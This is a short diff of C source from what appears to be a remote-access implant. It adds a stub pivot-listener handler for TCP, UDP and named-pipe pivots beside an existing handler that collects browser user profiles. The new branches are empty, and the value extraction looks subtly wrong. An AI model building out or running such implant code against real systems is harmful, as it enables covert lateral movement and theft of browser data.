@@ -3335,7 +3335,7 @@ PENVELOPE BrowserHandler
 {
 	PUSER_DATA* pUserDatas = NULL;
 	DWORD dwNumberOfUserDatas = 0;
-	PENVELOPE pRespEnvelope = NULL;;
+	PENVELOPE pRespEnvelope = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
 	DWORD k = 0;
@@ -3422,6 +3422,69 @@ CLEANUP:
 
 	FREE(pUserDatas);
 	FREE(pProfileList);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE PivotStartListenerHandler
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement PivotStartListenerReq[3];
+	DWORD i = 0;
+	LPVOID* UnmarshaledData = NULL;
+	UINT64 uPivotType = 0;
+	LPSTR lpBindAddress = NULL;
+	PBOOL pOptions = NULL;
+	UINT64 uNumberOfOptions = 0;
+
+	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
+		PivotStartListenerReq[i] = ALLOC(sizeof(PBElement));
+		PivotStartListenerReq[i]->dwFieldIdx = i + 1;
+	}
+
+	PivotStartListenerReq[0]->Type = Varint;
+	PivotStartListenerReq[1]->Type = Bytes;
+	PivotStartListenerReq[2]->Type = RepeatedVarint;
+	UnmarshaledData = UnmarshalStruct(PivotStartListenerReq, _countof(PivotStartListenerReq), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL) {
+		goto CLEANUP;
+	}
+
+	uPivotType = (UINT64)(PivotStartListenerReq[0]);
+	lpBindAddress = DuplicateStrA(((PBUFFER)(PivotStartListenerReq[1]))->pBuffer, 0);
+	uNumberOfOptions = *((PUINT64)(PivotStartListenerReq[2]));
+	pOptions = ALLOC(sizeof(BOOL) * uNumberOfOptions);
+	for (i = 0; i < uNumberOfOptions; i++) {
+		pOptions[i] = (BOOL)((PUINT64)(PivotStartListenerReq[2]))[i + 1];
+	}
+
+	if (uPivotType == PivotType_TCP) {
+
+	}
+	else if (uPivotType == PivotType_UDP) {
+
+	}
+	else if (uPivotType == PivotType_NamedPipe) {
+
+	}
+	else {
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
+		FREE(PivotStartListenerReq[i]);
+	}
+
+	if (UnmarshaledData != NULL) {
+		FREE(UnmarshaledData[1]);
+		FREE(UnmarshaledData[2]);
+		FREE(UnmarshaledData);
+	}
 
 	return pRespEnvelope;
 }
